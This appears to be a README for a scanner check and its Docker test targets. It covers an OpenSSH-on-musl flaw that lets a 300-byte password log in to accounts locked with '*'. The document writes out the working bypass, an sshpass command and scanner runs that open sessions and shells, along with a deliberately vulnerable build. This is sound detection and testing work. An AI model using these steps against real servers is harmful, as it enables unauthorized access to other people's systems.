# vuln-musl-crypt-star test target

This directory contains two Docker images for exercising the
`vuln-musl-crypt-star` check: a vulnerable target and a patched control.

## Background

OpenSSH releases before 10.6p2, built against musl libc with PAM disabled,
accept any password longer than 256 bytes for an account whose password
field is the literal `*`. musl `crypt(3)` returns the string `"*"` instead
of a hash when the key exceeds its 256-byte limit, and sshd compares that
return value against the stored `"*"` with `strcmp`. Accounts locked with
`!` are not affected. OpenSSH 10.6p2 rejects stored hashes shorter than
`MIN_PASSWORD_HASH_LEN` before calling `crypt(3)`.

Reference: [sshhole.com](https://sshhole.com/)

## How the check works

The check is enabled by default and runs whenever all of the following hold:

1. The server banner parses as OpenSSH with a version older than 10.6p2.
   Non-OpenSSH banners, OpenSSH 10.6p2 and later, and OpenSSH banners with
   no version number are skipped without making a connection.
2. The server advertises `password` authentication.
3. A random short password is rejected. A server that accepts any password
   belongs to the `password-any` check instead.

It then authenticates with a 300-byte password, opens a session, and runs
`id`. A finding is recorded only when the command runs on that session.
Reaching the authentication or session stage without a completed command
is not enough. The 300-byte password is cached as the session credential so
`-I first` and `-I all` reconnect with it.

## Files

| File | Purpose |
|------|---------|
| `Dockerfile` | OpenSSH 9.7p1 built from source on Alpine 3.20 without PAM. Vulnerable. |
| `Dockerfile.patched` | Same account layout using the Alpine `openssh-server` package, which backports the fix but still announces `OpenSSH_9.7`. Not vulnerable. |

Both images use the same accounts:

| User | Hash in /etc/passwd | Notes |
|------|-------------------|-------|
| root | `*` | Affected account |
| alice | `*` | Affected account |
| bob | `$6$rounds=5000$salt$placeholder` | Provides the sha512crypt salt that `pick_salt()` finds when the target hash is too short |

The vulnerable image builds from source because Alpine backported the
upstream fix into its `openssh` packages on 2026-11-05. The packaged sshd
still reports `OpenSSH_9.7`, so the version gate alone cannot distinguish the
two images. Only the session attempt can.

## Setup

Build the sshamble binary and both images from the repository root:

```console
$ go build -o sshamble .
$ docker build -t sshamble-musl-crypt-star docs/targets/musl-crypt-star
$ docker build -t sshamble-musl-crypt-star-patched -f docs/targets/musl-crypt-star/Dockerfile.patched docs/targets/musl-crypt-star
```

Start the vulnerable target on port 2222 and the patched control on 2223:

```console
$ docker run -d --rm --name sshamble-musl-crypt-star -p 2222:22 sshamble-musl-crypt-star
$ docker run -d --rm --name sshamble-musl-crypt-star-patched -p 2223:22 sshamble-musl-crypt-star-patched
```

## Verify the check reports the vulnerable target

```console
$ ./sshamble scan -u alice -p 2222 -o vuln.json 127.0.0.1
```

The log should contain:

```
level=warning msg="127.0.0.1:2222 vuln-musl-crypt-star accepted a 300-byte password for user alice"
```

The JSON record in `vuln.json` should contain:

```json
{
  "version": "SSH-2.0-OpenSSH_9.7",
  "sessionMethod": "vuln-musl-crypt-star",
  "sessionOutput": "uid=1000(alice) gid=1000(alice) groups=1000(alice)",
  "vulns": [
    {
      "id": "vuln-musl-crypt-star",
      "proof": "A random short password was rejected, but a 300-byte password opened a session for alice. Session output: uid=1000(alice) gid=1000(alice) groups=1000(alice)",
      "ref": "https://sshhole.com/"
    }
  ]
}
```

Other session-stage checks (such as `vuln-tcp-forward`) run on the opened
session and may add their own findings.

## Verify the check does not report the patched control

```console
$ ./sshamble scan -u alice -p 2223 --checks vuln-musl-crypt-star -L debug -o patched.json 127.0.0.1
```

The debug log shows the check running on the 9.7 banner and stopping because
the long password was rejected:

```
level=debug msg="127.0.0.1:2223 vuln-musl-crypt-star is running for user alice"
level=debug msg="127.0.0.1:2223 vuln-musl-crypt-star did not open a session with the 300-byte password (stage ssh-userauth): authentication failed: 0"
```

The JSON record has no `sessionMethod` and no `vulns` entry.

## Verify the version gate

Point the check at any OpenSSH 10.6p2 or newer server, or any non-OpenSSH
server, with `-L debug`. The log shows the skip and no password attempts are
made:

```
level=debug msg="HOST:PORT vuln-musl-crypt-star skipped: server version \"SSH-2.0-OpenSSH_10.6p2\" is not a vulnerable OpenSSH release"
```

## Verify the interactive session

The cached 300-byte password is reused to open a new session for
interaction. Run a command non-interactively:

```console
$ ./sshamble scan -u alice -p 2222 --checks vuln-musl-crypt-star -I first --interact-auto "exec id" 127.0.0.1
```

The output ends with the command result:

```
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```

For a shell, use the default auto commands:

```console
$ ./sshamble scan -u alice -p 2222 --checks vuln-musl-crypt-star -I first 127.0.0.1
```

## Verify manually with sshpass

A 300-byte password opens a session on the vulnerable target:

```console
$ python3 -c "print('A'*300)" > longpass.txt
$ sshpass -f longpass.txt ssh \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 2222 alice@127.0.0.1 id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```

A short password is rejected on the vulnerable target, and both passwords
are rejected on the patched control (port 2223):

```console
$ sshpass -p wrong ssh \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o NumberOfPasswordPrompts=1 \
    -p 2222 alice@127.0.0.1 id
Permission denied, please try again.
```

## Unit tests

The Go tests start an in-process SSH server that accepts only passwords
longer than 256 bytes and cover the same cases without Docker: the finding
on a vulnerable banner, no finding when the long password is rejected, no
finding when any password is accepted, no connection for fixed or
non-OpenSSH banners, and reuse of the cached credential for interaction.

```console
$ go test ./cmd/ -run MuslCryptStar -v
```

## Cleanup

```console
$ docker stop sshamble-musl-crypt-star sshamble-musl-crypt-star-patched
```
